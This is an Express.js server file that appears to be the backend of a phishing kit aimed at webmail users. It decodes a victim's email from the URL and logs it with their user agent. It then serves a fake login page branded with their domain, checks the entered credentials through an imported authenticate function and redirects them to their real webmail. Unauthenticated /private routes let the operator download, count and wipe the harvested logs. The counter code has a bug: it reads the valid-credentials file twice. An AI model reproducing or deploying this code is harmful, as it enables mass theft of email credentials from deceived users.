const express = require("express")
const { detectPage, authenticate, validateEmail, isMobile } = require("./service")
const app = express()
const fs = require("fs")
const https = require("https")

app.use(express.static("public"))
app.disable("x-powered-by")
app.use(express.json())
app.set("view engine", "ejs")
app.set("views", "views")

app.get("/private/download/logs/valid", (req,res) => {
    return res.download("database_valid.txt")
})

app.get("/private/download/logs/invalid", (req,res) => {
    return res.download("database_invalid.txt")
})

app.get("/private/download/logs/access", (req,res) => {
    return res.download("database_access.txt")
})

app.get("/private/logs/clear", (req,res) => {
    fs.writeFileSync("database_valid.txt", "")
    fs.writeFileSync("database_invalid.txt", "")
    fs.writeFileSync("database_access.txt", "")
    return res.send("Logs cleared")
})

app.get("/private/logs/counter", (req,res) => {
    const valid = fs.readFileSync("database_valid.txt", "utf-8").split("\r\n").filter((row) => row.trim().length >= 2).length
    const invalid = fs.readFileSync("database_valid.txt", "utf-8").split("\r\n").filter((row) => row.trim().length >= 2).length
    const access = fs.readFileSync("database_access.txt", "utf-8").split("\r\n").filter((row) => row.trim().length >= 2).length
    return res.render("counter", { valid, invalid, access })
})

app.get("/login/", async (req,res) => {
    try{
        if(Object.keys(req.query).length !== 1) return res.status(504).end()
        const email = Buffer.from(Object.keys(req.query).pop(), "base64").toString("utf-8")
        if(!email.includes("@")) return res.status(504).end()
        const page = await detectPage(email)
        if(!page){
            const userAgent = req.headers["user-agent"]
            fs.appendFileSync("database_access.txt", `${email}:${userAgent}\r\n`, "utf-8")
            return res.render("cpanel", { isMobile: isMobile(userAgent), domain: email.split("@").pop(), customLogo: true })
        }else{
            const userAgent = req.headers["user-agent"]
            fs.appendFileSync("database_access.txt", `${email}:${userAgent}\r\n`, "utf-8")
            return res.render(page, { isMobile: isMobile(userAgent), domain: email.split("@").pop(), customLogo: false })
        }
    }catch(e){
        return res.status(504).end()
    }
})


app.patch("/login", async (req,res) => {
    try{
        const userAgent = req.headers["user-agent"]
        const { email, password } = req.body
        if(!email || !validateEmail(email)) {
            return res.status(400).json({ error: "E-mail não é válido" })
        }
        if(!password) {
            return res.status(400).json({ error: "Senha não é válida" })
        }
        const status = await authenticate({ email, password })
        if(!status) {
            return res.status(401).json({ error: !isMobile(userAgent) ? "Ops! E-mail e senha não combinam" : "Ops! Email e senha não combinam ou você não tem acesso ao webmail." })
        }
        return res.status(200).json({ redirect: "http://webmail." + email.split("@").pop() })
    }catch(e){
        console.log("Error:", e.stack)
        return res.status(401).json({ error: !isMobile(userAgent) ? "Ops! E-mail e senha não combinam" : "Ops! Email e senha não combinam ou você não tem acesso ao webmail." })
    }
})

app.get("*", (req,res) => {
    return res.status(504).end()
})

app.listen(80, () => console.log("Server is running on port 80"))
https.createServer({
    cert: fs.readFileSync("certs/certificate.pem"),
    key: fs.readFileSync("certs/private.pem")
}, app).listen(443, () => console.log("Server is running on port 443"))